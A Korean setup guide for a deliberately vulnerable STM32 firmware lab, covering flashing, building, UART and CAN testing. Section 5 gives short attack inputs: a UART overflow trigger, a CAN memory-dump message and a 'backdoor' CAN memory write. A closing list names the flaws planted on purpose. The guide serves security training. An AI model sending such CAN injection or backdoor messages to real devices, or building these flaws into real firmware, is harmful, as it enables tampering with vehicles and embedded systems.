# 펌웨어 플래싱 가이드

## 빠른 시작 (사전 빌드된 바이너리 사용)

⚠️ **주의**: 실제 바이너리를 빌드하려면 STM32CubeMX와 필요한 라이브러리를 설치해야 합니다.

## 1. STM32CubeProgrammer를 사용한 플래싱

### 준비 사항
- STM32F103C8T6 보드를 ST-Link로 PC에 연결
- STM32CubeProgrammer가 설치되어 있어야 함

### 플래싱 단계

1. **연결 확인**
```bash
"C:\Program Files\STMicroelectronics\STM32Cube\STM32CubeProgrammer\bin\STM32_Programmer_CLI.exe" -c port=SWD
```

2. **플래시 지우기 (선택사항)**
```bash
"C:\Program Files\STMicroelectronics\STM32Cube\STM32CubeProgrammer\bin\STM32_Programmer_CLI.exe" -c port=SWD -e all
```

3. **펌웨어 플래싱**
```bash
"C:\Program Files\STMicroelectronics\STM32Cube\STM32CubeProgrammer\bin\STM32_Programmer_CLI.exe" -c port=SWD -w firmware.hex -v -rst
```

## 2. 전체 빌드 프로세스 (개발자용)

### 필요 도구 설치

1. **STM32CubeMX 설치**
   - [STM32CubeMX 다운로드](https://www.st.com/en/development-tools/stm32cubemx.html)
   - STM32F1 HAL 라이브러리 다운로드

2. **ARM GCC 툴체인 설치**
   ```bash
   # Windows (MSYS2)
   pacman -S mingw-w64-x86_64-arm-none-eabi-gcc
   
   # Linux
   sudo apt-get install gcc-arm-none-eabi
   
   # macOS
   brew install arm-none-eabi-gcc
   ```

3. **FreeRTOS 다운로드**
   - [FreeRTOS 공식 사이트](https://www.freertos.org/a00104.html)
   - 또는 STM32CubeMX에서 Middleware로 추가

### 라이브러리 설정

HAL·CMSIS·FreeRTOS 는 ST 와 FreeRTOS 배포본을 그대로 쓰므로 저장소에 넣지 않습니다
(`.gitignore` 처리). 클론한 뒤 아래 세 개를 받아 놓아야 빌드가 됩니다.

```bash
cd firmware

# HAL 드라이버 (STM32CubeF1 의 서브모듈)
git clone --depth 1 https://github.com/STMicroelectronics/stm32f1xx_hal_driver \
    Drivers/STM32F1xx_HAL_Driver

# CMSIS 디바이스 헤더
git clone --depth 1 https://github.com/STMicroelectronics/cmsis_device_f1 \
    Drivers/CMSIS/Device/ST/STM32F1xx

# CMSIS 코어 헤더 (STM32CubeF1 의 Drivers/CMSIS/Include 를 복사)
#   core_cm3.h 등이 Drivers/CMSIS/Include/ 아래에 오면 됩니다.

# FreeRTOS 커널 → Middlewares/Third_Party/FreeRTOS/Source
git clone --depth 1 --branch V10.6.2 https://github.com/FreeRTOS/FreeRTOS-Kernel \
    Middlewares/Third_Party/FreeRTOS/Source
```

받은 뒤 배치가 맞는지 확인:

```
firmware/Drivers/STM32F1xx_HAL_Driver/{Inc,Src}/
firmware/Drivers/CMSIS/Include/core_cm3.h
firmware/Drivers/CMSIS/Device/ST/STM32F1xx/Include/stm32f1xx.h
firmware/Middlewares/Third_Party/FreeRTOS/Source/{tasks.c,include/FreeRTOS.h}
firmware/Middlewares/Third_Party/FreeRTOS/Source/portable/GCC/ARM_CM3/port.c
```

> Windows 에서 패키지 매니저 없이 툴체인을 갖추려면 xPack 릴리스 zip 을 풀어 쓰면
> 됩니다 — `arm-none-eabi-gcc` (xpack-dev-tools/arm-none-eabi-gcc-xpack) 와
> `make` (xpack-dev-tools/windows-build-tools-xpack). PATH 에 두 `bin` 을 넣고
> `make all` 을 실행합니다.

### 빌드 명령

```bash
cd firmware
make clean
make all
```

### 플래싱

```bash
make flash
```

## 3. 디버깅

### UART 콘솔 연결
- 보드레이트: 115200
- 데이터 비트: 8
- 정지 비트: 1
- 패리티: None

### 터미널 프로그램 사용
```bash
# Windows (PuTTY 또는)
putty -serial COM3 -sercfg 115200,8,n,1

# Linux
screen /dev/ttyUSB0 115200

# macOS
screen /dev/tty.usbserial-* 115200
```

## 4. CAN 통신 테스트

### 필요 하드웨어
- USB-CAN 어댑터 (CANable, PCAN-USB 등)
- CAN 트랜시버 (SN65HVD230)
- 120Ω 종단 저항

### CAN 연결
```
STM32 PB8 (CAN_RX) ─→ 트랜시버 RX
STM32 PB9 (CAN_TX) ─→ 트랜시버 TX
트랜시버 CANH ─→ CAN 버스 H
트랜시버 CANL ─→ CAN 버스 L
```

### Linux에서 CAN 테스트 (can-utils)
```bash
# CAN 인터페이스 설정
sudo ip link set can0 type can bitrate 500000
sudo ip link set can0 up

# 메시지 모니터링
candump can0

# 테스트 메시지 전송
cansend can0 100#0A00140001000000
```

## 5. 취약점 테스트 예제

### 버퍼 오버플로우 테스트
```bash
# UART 콘솔에서
set rate 99999
set auth 2
```

### CAN 명령 주입
```python
# Python + python-can
import can

bus = can.Bus(interface='socketcan', channel='can0', bitrate=500000)

# 메모리 덤프 명령
msg = can.Message(
    arbitration_id=0x110,
    data=[0x06, 0x00, 0x00, 0x00, 0x20, 0x00, 0x10, 0x00],
    is_extended_id=False
)
bus.send(msg)
```

### 백도어 접근
```bash
# CAN ID 0x666으로 메모리 쓰기
cansend can0 666#EFBEADDE78560000
```

## 6. 문제 해결

### ST-Link 연결 실패
- 드라이버 재설치: [ST-Link 드라이버](https://www.st.com/en/development-tools/stsw-link009.html)
- 리셋 버튼을 누른 상태로 연결 시도
- BOOT0 핀이 GND에 연결되어 있는지 확인

### 빌드 실패
- ARM GCC 경로 확인: `arm-none-eabi-gcc --version`
- 필요한 라이브러리 파일 확인
- Makefile의 경로 설정 확인

### CAN 통신 실패
- 종단 저항 (120Ω) 확인
- 트랜시버 전원 (3.3V) 확인
- CAN 속도 설정 확인 (500kbps)

## 보안 경고

이 펌웨어는 교육 목적으로만 사용하세요. 포함된 취약점:
- 스택 보호 없음
- 실행 가능한 스택
- 포맷 스트링 취약점
- 버퍼 오버플로우
- 하드코딩된 패스워드
- 메모리 직접 접근
- CAN 메시지 인증 없음